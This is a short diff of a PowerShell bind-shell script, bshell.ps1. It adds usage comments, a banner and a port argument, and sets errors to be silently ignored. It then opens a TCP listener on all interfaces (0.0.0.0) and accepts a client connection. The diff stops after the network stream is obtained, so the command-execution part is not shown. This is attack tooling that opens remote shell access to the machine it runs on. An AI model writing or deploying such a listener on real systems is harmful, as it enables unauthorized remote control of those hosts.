@@ -1,4 +1,15 @@
-$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',PORT);
+## USE: .\bshell.ps1 PORT
+## EX: .\bshell.ps1 9090
+echo @'
+
+## USE .\bshell.ps1 [PORT]
+### EX: .\bshell.ps1 9090
+## DEFAULT LISTERNER: 0.0.0.0
+
+'@
+$ErrorActionPreference= 'silentlycontinue'
+[int]$port = $args[0]
+$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',$port);
 $listener.start();
 $client = $listener.AcceptTcpClient();
 $stream = $client.GetStream();
